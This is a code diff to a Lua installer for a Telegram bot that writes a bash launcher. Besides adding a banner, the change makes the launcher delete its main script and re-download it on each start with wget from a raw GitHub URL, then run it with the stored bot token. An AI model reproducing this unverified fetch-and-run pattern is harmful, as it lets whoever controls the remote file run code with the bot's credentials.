@@ -3,6 +3,17 @@ https = require("ssl.https")
 http = require("socket.http")
 JSON = dofile("./File_Libs/JSON.lua")
 local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+print([[
+
+
+#  _____  ________      ______  _____  
+#  |  __ \|  ____\ \    / / __ \|  __ \ 
+#  | |__) | |__   \ \  / / |  | | |__) |
+#  |  _  /|  __|   \ \/ /| |  | |  _  / 
+#  | | \ \| |____   \  / | |__| | | \ \ 
+#  |_|  \_\______|   \/   \____/|_|  \_\
+
+]])
 Server_Tshake = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
 local AutoFiles_Tshake = function() 
 local Create_Info = function(Token,Sudo,UserName)  
@@ -69,7 +80,8 @@ RunTshake:write([[
 #!/usr/bin/env bash
 cd $HOME/TshAkEx
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
-      
+rm -fr Tshake.lua
+wget "https://raw.githubusercontent.com/amrjava/alfapro/main/Tshake.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Tshake.lua -p PROFILE --bot=$token
